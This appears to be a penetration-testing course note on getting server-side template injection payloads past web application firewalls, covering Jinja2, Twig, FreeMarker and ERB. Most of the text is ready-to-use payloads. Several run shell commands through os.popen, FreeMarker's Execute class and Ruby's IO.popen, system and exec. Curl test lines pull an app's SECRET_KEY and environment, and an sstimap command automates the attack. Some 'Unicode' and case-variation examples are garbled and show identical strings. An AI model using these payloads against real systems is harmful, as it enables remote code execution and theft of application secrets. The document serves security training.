---
tags: [vapt, ssti, advanced]
difficulty: advanced
module: "09 - SSTI"
topic: "09.09 SSTI WAF Bypass"
---

# 09.09 — SSTI WAF Bypass

## What WAFs Block

```
COMMON SSTI WAF RULES:
  ✓ {{ and }} (template delimiters)
  ✓ Underscores _ (used in __class__, __mro__, etc.)
  ✓ Keywords: class, mro, subclasses, init, globals
  ✓ os, system, popen, exec keywords
  ✓ Dot notation: .os.popen, .__class__
  ✓ Length limits on input

BYPASS GOAL:
  Express the same Jinja2/Twig/FreeMarker logic
  in a way the WAF doesn't recognize as dangerous.
```

---

## Jinja2 WAF Bypasses

### Bracket Notation Instead of Dot

```python
# DOT NOTATION (blocked by WAF):
{{config.SECRET_KEY}}
{{''.__class__.__mro__}}

# BRACKET NOTATION (often not blocked):
{{config['SECRET_KEY']}}
{{''['__class__']['__mro__']}}

# ATTRIBUTE FILTER (another alternative):
{{request|attr('environ')}}
{{''|attr('__class__')|attr('__mro__')}}
```

### Encoding Underscores

```python
# IF _ IS BLOCKED:
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
# \x5f = _ in hex

{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')[1]|attr('\x5f\x5fsubclasses\x5f\x5f')()}}

# UNICODE:
{{''|attr('__class__')}}
# _ = _
```

### Building Strings Without Keywords

```python
# IF 'os' OR 'popen' KEYWORDS ARE BLOCKED:

# BUILD STRINGS DYNAMICALLY:
{{'o'~'s'}}   → 'os' (Jinja2 ~ = concatenation!)
{{'p'~'o'~'p'~'e'~'n'}}  → 'popen'

# ACCESS CYCLER GLOBALS:
{{cycler.__init__.__globals__['o'~'s']['p'~'ope'~'n']('id').read()}}

# STRING FROM CHARS:
{{'os'[0]}}   → 'o'
{{'os'[1]}}   → 's'

# CONCATENATE USING FORMAT:
{{"%s%s"|format("o","s")}}  → 'os'
```

### Bypassing {{ }} Filter

```python
# IF {{ }} IS BLOCKED — USE {% set %} + PRINT FILTER:
{% set x = 7*7 %}{{x}}    ← still uses {{ }} for output
{% print 7*7 %}            ← Jinja2 print tag (if available)

# USE BLOCK TAGS:
{%if 7*7==49%}YES{%endif%}   ← boolean oracle (no {{ needed!)
{%for x in [1,2,3]%}{{x}}{%endfor%}

# COMMENTS (sometimes less filtered):
{#{{ 7*7 }}#}   ← won't execute (it's a comment)
# Not useful for bypass, but sometimes misunderstood by WAFs
```

### Jinja2 Config Access Without 'config' Keyword

```python
# IF 'config' IS FILTERED:
{{request.application.__self__._get_current_object().config}}
{{current_app.config}}         ← if current_app is in context
{{g.app.config}}               ← via g object
```

---

## Twig WAF Bypasses

```php
// IF _self IS BLOCKED:
// Try alternate Twig globals:
{{_context}}         → same as _context, may work
{{app}}              → Symfony app object

// IF registerUndefinedFilterCallback IS BLOCKED:
// Try other Twig extension methods or Symfony-specific objects
{{app.request.server.get('PATH')}}   ← read env via Symfony

// STRING MANIPULATION:
{{"shell_exec"}}    → string, not function call
// Twig doesn't allow calling arbitrary functions
// Must use registered functions or filters
```

---

## FreeMarker WAF Bypasses

```java
// IF Execute IS BLOCKED BY CLASS NAME:
// Try alternate spelling or reflection:
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("id")}

// SPLIT CLASSNAME:
<#assign c1 = "freemarker.template">
<#assign c2 = ".utility.Execute">
<#assign ex = (c1+c2)?new()>
${ex("id")}

// USE NEW LINES BETWEEN PARTS:
<#assign
  ex = "freemarker.template.utility.Execute"?new()
>
${ex("id")}

// ENCODE CLASS NAME IN FTL:
// FreeMarker supports variable assignment from string
// Hard to encode class names, but whitespace tricks work
```

---

## ERB WAF Bypasses

```ruby
# IF BACKTICK IS BLOCKED:
# Alternatives:
<%= IO.popen('id').read %>   ← IO.popen
<%= system('id') %>          ← system (no output in HTML)
<%= %x(id) %>                ← %x() notation
<%= exec('id') %>            ← exec
<%= Process.spawn('id') %>   ← spawn

# IF SPACE AFTER POPEN IS BLOCKED:
<%= IO.popen('id')['read']() %>

# IF QUOTES ARE FILTERED:
<%= IO.popen(%q{id}).read %>    ← %q{} = single-quoted string
<%= IO.popen(%Q{id}).read %>    ← %Q{} = double-quoted string
```

---

## Universal WAF Bypass Techniques

```
TECHNIQUE         EXAMPLE
---------         -------
URL Encoding      %7B%7B7*7%7D%7D = {{7*7}}
Double Encoding   %257B%257B7*7%257D%257D
Unicode           {{7*7}} = {{7*7}}
HTML Entities     &#123;&#123;7*7&#125;&#125; (in some contexts)
Newlines          Split payload across multiple lines
Comments          Inject between template comment markers
Case Variation    Some engines: {{7*7}} = {{7*7}} (case doesn't matter)
Whitespace        {{ 7 * 7 }} with spaces
```

---

## Testing Bypass Effectiveness

```bash
# TEST EACH BYPASS APPROACH:

# 1. Bracket notation:
curl -s "https://target.com/?n=%7B%7Bconfig%5B'SECRET_KEY'%5D%7D%7D"
# {{config['SECRET_KEY']}}

# 2. Attr filter:
curl -s "https://target.com/?n=%7B%7Brequest%7Cattr('environ')%7D%7D"
# {{request|attr('environ')}}

# 3. Encoded underscore:
curl -s "https://target.com/?n=%7B%7B''%7Cattr('%5Cx5f%5Cx5fclass%5Cx5f%5Cx5f')%7D%7D"
# {{''|attr('\x5f\x5fclass\x5f\x5f')}}

# USE SSTIMAP WITH WAF BYPASS:
python3 sstimap.py -u "https://target.com/?n=*" --level 5
```

---

## Related Notes
- [[04 - SSTI in Jinja2]] — Jinja2 payloads
- [[05 - SSTI in Twig]] — Twig payloads
- [[08 - SSTI to RCE Escalation]] — escalation
- [[10 - SSTImap Tool Usage]] — automated bypass
- [[Module 15 - WAF Bypass]] — general WAF bypass module
